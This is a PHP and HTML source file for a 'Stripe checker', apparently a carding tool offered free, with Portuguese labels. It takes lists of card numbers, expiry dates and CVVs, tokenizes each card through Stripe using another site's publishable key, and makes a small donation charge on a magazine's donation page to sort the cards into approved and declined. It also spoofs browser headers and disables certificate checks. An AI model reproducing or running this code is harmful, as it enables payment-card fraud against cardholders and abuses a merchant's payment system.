<!--CODADO POR @THEQUEEN, SKYPE: queen.priv, ao upar este arquivo estou ciente de que o programador dele foi o @thequeen e todos os créditos são dele.-->
<html>
    <head>
        <title>STRIPE CHECKER</title>
    </head>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">  
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap-theme.min.css">
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>  
        <meta charset="UTF-8">
    </head>
	
    <body background="http://i.imgur.com/QXkuXJ9.jpg">
    <center><h2><strong><font color="red">TESTADOR DE INFOCC GRINGA STRIPE API ! SOURCE FREE BY <a href="skype: queen.priv"><font color="white">@TheQueen</font></a></strong></h2></font>
            <form name="frm-CardCheck" method="post">
                <textarea name="lista" class="input" cols="150" class="form-control" rows="10" placeholder="4093081909142000|07|2021|836"></textarea>
                <br><br>
                <font color="#ff0000"><span><b>DELIMITADOR:   </b></font><input name="delimitador" type="text" style="width: 5%; text-align: center;" value="|"></font>
                <center><BR> <input type="submit" class="btn btn-primary" value="CHECAR" style="width:200px"><center>
				
            </form>
            <br><br>
    </body>
</html>

<?php

if(isset($_POST['lista']) && $_POST['delimitador'])
{
    separar(trim($_POST['lista']), $_POST['delimitador']);
}
function separar($lista, $delimitador){
$ab = split("\n", $lista);
$cb = count($ab);
for($x = 0; $x < $cb; $x++){
    list($card, $mes, $ano, $cvv) = split("\\".$delimitador, $ab[$x]);
    testar($card, $mes, $ano, $cvv);
    flush();
    ob_flush();
}
}
function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}
function testar($card, $mes, $ano, $cvv){
            $curl = curl_init();   
            curl_setopt($curl, CURLOPT_URL, "https://api.stripe.com/v1/tokens");
            $User_Agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0';
            $request_headers = array();
            $request_headers[] = 'Host: api.stripe.com';
            $request_headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0';
            $request_headers[] = 'Accept: application/x-www-form-urlencoded';
            $request_headers[] = 'Referer: https://js.stripe.com/v2/channel.html?stripe_xdm_e=https%3A%2F%2Fauth.jacobinmag.com&stripe_xdm_c=default472515&stripe_xdm_p=1';
            curl_setopt($curl, CURLOPT_HTTPHEADER, $request_headers);
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 0);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($curl, CURLOPT_POST, 1); 
            curl_setopt($curl, CURLOPT_POSTFIELDS, "key=pk_live_OzHRafzizeRQ9JxNYoYRzPMn&payment_user_agent=stripe.js%2F1b0d1ee&card[name]=Juliano&card[number]=$card&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano");
            $dados = curl_exec($curl);
            //echo $dados;
            if(preg_match("/security code is invalid./", $dados)){
                echo "<font color='yellow'><b>#CARTÃO BLOQUEADO PELO BANCO → $card:$mes:$ano:$cvv @THEQUEEN<b></font><br>";
            }elseif(preg_match("/Your card number is incorrect./", $dados)){
               echo "<font color='yellow'><b>#CARTAO INVALIDO → $card:$mes:$ano:$cvv @THEQUEEN<b></font><br>"; 
            }elseif(!preg_match("/security code is invalid./", $dados) && !preg_match("/card number is incorrect./", $dados) !== false){
            $token = getStr($dados, '"id": "','",');
            $testador = curl_init();
            curl_setopt($testador, CURLOPT_URL, "https://auth.jacobinmag.com/donate");
            $User_Agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0';
            $request_headers = array();
            $request_headers[] = 'Host: auth.jacobinmag.com';
            $request_headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0';
            $request_headers[] = 'Accept: application/x-www-form-urlencoded';
            curl_setopt($testador, CURLOPT_HTTPHEADER, $request_headers);
            curl_setopt($testador, CURLOPT_FOLLOWLOCATION, 0);
            curl_setopt($testador, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($testador, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($testador, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($testador, CURLOPT_POST, 1); 
            curl_setopt($testador, CURLOPT_POSTFIELDS, "donate.amount=5&donate.typ=onetime&donate.name=Juliano&donate.email=guic1609%40gmail.com&donate.address=rua+aloiso&donate.cc_token=$token");
            $testou = curl_exec($testador);
            if(strpos($testou,'Your card was declined.') !== false){
                echo "<font color='red'><b>#Reprovada → $card:$mes:$ano:$cvv @THEQUEEN<b></font><br>";
            }else{
                echo "<font color='white'><b>#Aprovada → $card:$mes:$ano:$cvv @THEQUEEN<b></font><br>";
            }
}
}
